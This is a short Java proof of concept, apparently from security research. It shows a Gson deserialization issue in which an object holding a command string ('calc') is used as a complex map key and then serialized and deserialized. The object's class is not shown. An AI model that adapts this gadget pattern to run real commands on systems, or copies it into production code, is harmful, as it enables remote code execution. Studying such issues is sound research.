package top.anemone.gsondemo.PoC2;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;

import java.util.HashMap;

public class VulnContainer {
    private HashMap<VulnObject, String> vulnObjectHashMap;

    public HashMap<VulnObject, String> getvulnObjectHashMap() {
        return vulnObjectHashMap;
    }

    public void setvulnObjectHashMap(HashMap<VulnObject, String> vulnObjectHashMap) {
        this.vulnObjectHashMap = vulnObjectHashMap;
    }

    public static void main(String[] args) {
        VulnObject object=new VulnObject();
        object.setCmd("calc");
        HashMap<VulnObject, String> map=new HashMap<>();
        map.put(object,"foo");
        VulnContainer vulnContainer=new VulnContainer();
        vulnContainer.setvulnObjectHashMap(map);

        Gson gson1 = new GsonBuilder().enableComplexMapKeySerialization().create();
        String json=gson1.toJson(vulnContainer);
        System.out.println(json);

        Gson gson2 = new GsonBuilder().enableComplexMapKeySerialization().create();
        Object myContainer2=gson2.fromJson(json, Object.class);
        System.out.println(myContainer2);
    }
}
